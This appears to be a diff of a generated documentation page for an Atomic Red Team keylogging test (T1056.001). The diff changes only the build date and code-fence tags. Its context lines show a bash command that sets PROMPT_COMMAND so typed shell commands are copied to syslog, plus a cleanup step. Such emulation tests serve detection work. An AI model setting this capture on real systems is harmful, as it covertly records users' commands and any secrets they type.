@@ -6,7 +6,7 @@ generated: "true"
 attack_technique_id: "T1056.001"
 attack_technique_name: "Input Capture: Keylogging"
 source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1056.001/T1056.001.yaml"
-build_date: "2026-04-26 14:38:39"
+build_date: "2026-04-26 17:02:12"
 executor: "sh"
 aliases:
   - "0e59d59d-3265-4d35-bebd-bf5c1ec40db5"
@@ -46,7 +46,7 @@ This test requires to be run in a bash shell and that logger and tee are install
 
 ### Prerequisite Check
 
-```text
+```bash
 if [ "$(echo $SHELL)" != "/bin/bash" ]; then echo -e "\n***** Bash not running! *****\n"; exit 1; fi
 if [ ! -x "$(command -v logger)" ]; then echo -e "\n***** logger NOT installed *****\n"; exit 1; fi
 if [ ! -x "$(command -v tee)" ]; then echo -e "\n***** tee NOT installed *****\n"; exit 1; fi
@@ -54,7 +54,7 @@ if [ ! -x "$(command -v tee)" ]; then echo -e "\n***** tee NOT installed *****\n
 
 ### Get Prerequisite
 
-```text
+```bash
 echo ""
 ```
 
@@ -65,7 +65,7 @@ echo ""
 
 ### Command
 
-```sh
+```bash
 PROMPT_COMMAND='history -a >(tee -a ~/.bash_history |logger -t "$USER[$$] $SSH_CONNECTION ")'
 echo "\$PROMPT_COMMAND=$PROMPT_COMMAND"
 tail /var/log/syslog
@@ -73,7 +73,7 @@ tail /var/log/syslog
 
 ### Cleanup
 
-```sh
+```bash
 unset PROMPT_COMMAND
 ```
 
